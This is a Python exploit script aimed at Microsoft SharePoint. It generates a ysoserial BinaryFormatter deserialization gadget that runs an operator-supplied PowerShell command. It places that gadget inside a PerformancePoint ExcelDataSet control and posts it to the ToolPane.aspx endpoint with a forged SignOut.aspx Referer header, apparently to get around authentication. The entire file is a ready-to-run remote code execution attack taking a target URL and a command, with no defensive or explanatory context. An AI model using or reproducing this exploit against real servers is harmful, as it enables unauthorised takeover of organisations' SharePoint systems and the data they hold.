import argparse
import requests
import urllib.parse
import subprocess

def make_post_request(url, command):
    headers = {
        "Referer": "/_layouts/SignOut.aspx",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Content-Type": "application/x-www-form-urlencoded",
        "Connection": "close"
    }
    args = [r'.\ysoserial\ysoserial.exe', '-g', 'DataSetXML', '-f', 'BinaryFormatter', '-c', f"powershell -c {command}", '--rawcmd', '-o', 'gzip']
    result = subprocess.run(args, capture_output=True, text=True)
    CompressedDataTable = result.stdout.strip()
    #print(CompressedDataTable)
    dwp = f"""
    <%@ Register Tagprefix="Scorecard" Namespace="Microsoft.PerformancePoint.Scorecards" Assembly="Microsoft.PerformancePoint.Scorecards.Client, Version=16.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c" %>

<asp:UpdateProgress ID="UpdateProgress1" DisplayAfter="10" 
runat="server" AssociatedUpdatePanelID="upTest">
<ProgressTemplate>
  <div class="divWaiting">            
    <Scorecard:ExcelDataSet CompressedDataTable="{CompressedDataTable}" DataTable-CaseSensitive="false" runat="server">
</Scorecard:ExcelDataSet>
  </div>
</ProgressTemplate>
</asp:UpdateProgress>
    """
    data = {
        "MSOTlPn_Uri": f"{url}/_controltemplates/15/AclEditor.ascx",
        "MSOTlPn_DWP": dwp
    }
    url = f"{url}/_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx"
    try:
        response = requests.post(url, data=data, headers=headers, verify=False)
        print(f"Done, check task manager")
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="usage python exploit.py -u <siteurl> -c <command to run>")
    parser.add_argument("-u", "--url", help="URL of target", required=True)
    parser.add_argument("-c", "--command", help="Command to run", required=True)
    args = parser.parse_args()
    make_post_request(args.url, args.command)
